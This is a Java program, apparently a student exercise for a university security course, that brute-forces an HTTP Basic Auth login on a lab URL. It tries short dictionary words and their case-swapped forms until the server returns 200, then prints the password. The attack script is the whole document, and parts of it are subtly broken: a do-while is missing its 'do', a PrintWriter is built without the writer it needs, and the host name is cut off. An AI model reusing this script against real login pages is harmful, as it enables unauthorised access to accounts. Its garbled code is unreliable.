import java.io.*;
import java.net.*;











public class Dictionary
{
   private String urlString = "http://sec-crack.cs.rmit.edu./SEC/2/index.php";
   private static String password;
   private static int length;          
   private static int t_counter;       
   private static int f_counter;       
                                       
   private static int respCode;        
   private static BufferedReader buf;  

   public Dictionary()
   {
      FileReader fRead;
      Authenticator.setDefault(new DictionaryAuthenticator());
      t_counter = 0;
      f_counter = 0;
      length = 0;

      try
      {
         fRead = new FileReader("/usr/share/lib/dict/words");
         buf = new BufferedReader(fRead);
      }
      catch (FileNotFoundException e)
      {
         System.out.println("File not found");
      }
   }

   public static void main(String[] args)
   {
      Dictionary dict = new Dictionary();
      String file = " ";
      while(respCode != 200 )
      {
         file = dict.fetchURL();
      }
      System.out.println("Number of attempts: " + t_counter);
      System.out.println("Password: " + password);
      System.out.println(file);
   }

   private String fetchURL()
   {
      StringWriter sw = new StringWriter();
      PrintWriter pw = new PrintWriter();

      try
      {
         URL url = new URL(urlString);
         HttpURLConnection huc = (HttpURLConnection)url.openConnection();
         respCode = huc.getResponseCode();
         InputStream content = huc.getInputStream();
         BufferedReader in = 
            new BufferedReader (new InputStreamReader (content));
         String line;
         while ((line = in.readLine()) != null) 
         {
            pw.println(line);
         }
      } catch (IOException e) {
         pw.println("Error  URL");
      }
      return sw.toString();
   }
            
   class DictionaryAuthenticator extends Authenticator 
   {
      private String username = "";

      protected PasswordAuthentication getPasswordAuthentication()
      {
         return new PasswordAuthentication(username,generatePassword());
      }

      protected char[] generatePassword()
      {
         String word = null;
         int chars;
         char c[] = null;
 
         chars = 0;
       
         if(f_counter == 0) 
         
         
         { 
            try
            {
               
               {
                  word = buf.readLine();
                  if(word != null)
                  {
                     length = word.length();
                     chars = 0;
                     for(int i=0; i<length; i++)
                     {
                        if(Character.isLetter(word.charAt(i))) chars++;
                     }
                  }
               }
               while( word != null && (length > 3 || chars != length));

            }
            catch (IOException ioe)
            {
               System.out.println("IO Error: " + ioe);
            }

            if(word != null)
            {
               c = word.toCharArray(); 
               password = new String(c);
            } 
            else
            {
               System.out.println(" more words in dictionary");
               System.exit(0);
            }

            f_counter++;
         } 
         else
         
         {
            c = password.toCharArray(); 
            for(int i=0; i< length; i++)
            {
               if(Character.isLowerCase(c[i]))
               {
                  c[i] = Character.toUpperCase(c[i]);
               }
               else
               {
                  c[i] = Character.toLowerCase(c[i]);
               }
            }
            password = new String(c);
            f_counter = 0;
         }

         t_counter++;

         return c;
      }
   }
}
